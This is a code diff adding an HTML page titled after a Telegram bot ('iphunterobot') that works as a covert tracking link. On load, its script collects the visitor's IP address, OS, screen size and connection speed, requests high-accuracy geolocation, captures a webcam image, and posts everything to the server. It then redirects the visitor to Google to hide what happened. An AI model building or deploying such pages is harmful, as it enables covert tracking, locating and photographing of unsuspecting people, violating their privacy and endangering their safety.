@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" sizes="32x32" href="32px_icon.png">
+    <link rel="icon" type="image/png" sizes="48x48" href="48px_icon.png">
+    <title>t.me/iphunterobot</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #ffcccc, #ccffcc, #ccccff);
+            background-size: 400% 400%;
+            animation: gradientAnimation 10s ease infinite;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+    </style>
+</head>
+<body>
+    <script>
+        let dataSubmitted = false;
+
+        function getOSInfo() {
+            let osInfo = "Unknown OS";
+            let version = "";
+            const userAgent = navigator.userAgent;
+
+            if (userAgent.indexOf("Win") !== -1) {
+                osInfo = userAgent.indexOf("WOW64") !== -1 || userAgent.indexOf("Win64") !== -1 ? "Windows x64" : "Windows x32";
+                const winVersionMatch = userAgent.match(/Windows NT (\d+\.\d+)/);
+                if (winVersionMatch) {
+                    version = `Version ${winVersionMatch[1]}`;
+                }
+            } else if (userAgent.indexOf("Mac") !== -1) {
+                osInfo = "MacOS";
+                const macVersionMatch = userAgent.match(/Mac OS X (\d+[_\.\d]*)/);
+                if (macVersionMatch) {
+                    version = `Version ${macVersionMatch[1].replace(/_/g, ".")}`;
+                }
+            } else if (userAgent.indexOf("Linux") !== -1) {
+                osInfo = "Linux (Android)";
+                const androidVersionMatch = userAgent.match(/Android (\d+\.\d+)/);
+                if (androidVersionMatch) {
+                    version = `Version ${androidVersionMatch[1]}`;
+                }
+            } else if (userAgent.indexOf("Android") !== -1) {
+                osInfo = "Android";
+                const androidVersionMatch = userAgent.match(/Android (\d+\.\d+)/);
+                if (androidVersionMatch) {
+                    version = `Version ${androidVersionMatch[1]}`;
+                }
+            } else if (userAgent.indexOf("like Mac") !== -1) {
+                osInfo = "iOS";
+                const iosVersionMatch = userAgent.match(/OS (\d+_\d+)/);
+                if (iosVersionMatch) {
+                    version = `Version ${iosVersionMatch[1].replace(/_/g, ".")}`;
+                }
+            }
+
+            return `${osInfo} ${version}`;
+        }
+
+        (async () => {
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+
+            const osInfo = getOSInfo();
+
+            const dnsInfo = await fetch("https://api.ipify.org/?format=json")
+                .then(response => response.json())
+                .then(data => data.ip);
+
+            const measureInternetSpeed = () => {
+                return new Promise((resolve) => {
+                    const startTime = new Date().getTime();
+                    const img = new Image();
+                    img.onload = () => {
+                        const endTime = new Date().getTime();
+                        const duration = (endTime - startTime) / 1000;
+                        const speed = 1 / duration;
+                        resolve(`${speed.toFixed(2)} Mbps`);
+                    };
+                    img.src = "https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png?" + startTime;
+                });
+            };
+
+            const getLocationAndCamera = () => {
+                return new Promise((resolve) => {
+                    let locationInfo = "unknown";
+                    let cameraImage = null;
+
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition((position) => {
+                            locationInfo = `${position.coords.latitude},${position.coords.longitude}`;
+                            resolve({ locationInfo, cameraImage });
+                        }, () => resolve({ locationInfo, cameraImage }), { enableHighAccuracy: true });
+                    } else {
+                        resolve({ locationInfo, cameraImage });
+                    }
+                });
+            };
+
+            const getCameraImage = () => {
+                return new Promise((resolve) => {
+                    navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 320;
+                        canvas.height = 240;
+                        const context = canvas.getContext('2d');
+
+                        video.addEventListener('loadeddata', () => {
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const cameraImage = canvas.toDataURL('image/png');
+                            stream.getTracks().forEach(track => track.stop()); 
+                            resolve(cameraImage);
+                        });
+                    }).catch(() => resolve(null));
+                });
+            };
+
+            const speed = await measureInternetSpeed();
+            const { locationInfo } = await getLocationAndCamera();
+            const cameraImage = await getCameraImage();
+
+            if (!dataSubmitted) {
+                dataSubmitted = true;
+
+                const data = {
+                    user_id: "{{ user_id }}",
+                    link_name: "{{ link_name }}",
+                    referer_id: "{{ referer_id }}",
+                    ip_address: "{{ ip_address }}",
+                    whois_link: "{{ whois_link }}",
+                    browser_info: "{{ browser_info }}",
+                    referer: "{{ referer }}",
+                    language: "{{ language }}",
+                    visit_time: "{{ visit_time }}",
+                    screen_resolution: screenResolution,
+                    os_info: osInfo,
+                    internet_speed: speed,
+                    dns_info: dnsInfo,
+                    location_info: locationInfo,
+                    camera_image: cameraImage
+                };
+
+                await fetch("/submit_data", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data),
+                });
+
+                window.location.href = "https://www.google.com";
+            }
+        })();
+
+        setTimeout(() => {
+            if (!dataSubmitted) {
+                window.location.href = "/{{ link_name }}";
+            }
+        }, 15000);
+
+        window.addEventListener('beforeunload', function (e) {
+            if (!dataSubmitted) {
+                window.location.href = "/{{ link_name }}";
+            }
+        });
+    </script>
+</body>
+</html>
